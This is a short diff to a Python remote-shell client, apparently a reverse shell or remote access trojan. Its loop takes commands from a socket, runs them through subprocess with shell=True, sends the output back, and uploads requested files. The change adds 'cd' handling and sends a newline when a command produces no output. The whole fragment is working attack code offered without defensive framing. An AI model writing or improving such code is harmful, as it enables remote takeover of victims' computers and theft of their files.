@@ -53,7 +53,15 @@ while True:
     elif com.startswith("download"):
         f=com[9:]
         upload(f)
+    elif com.startswith("cd"):
+        if com=="cd ..":
+            os.chdir("..")
+        else:
+            os.chdir(com[3:])
     else:
         proc = subprocess.Popen(com[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         op= proc.stdout.read()+proc.stderr.read()
-        s.send(op)
+        if op=='':
+            s.send(b"\n")
+        else:
+            s.send(op)
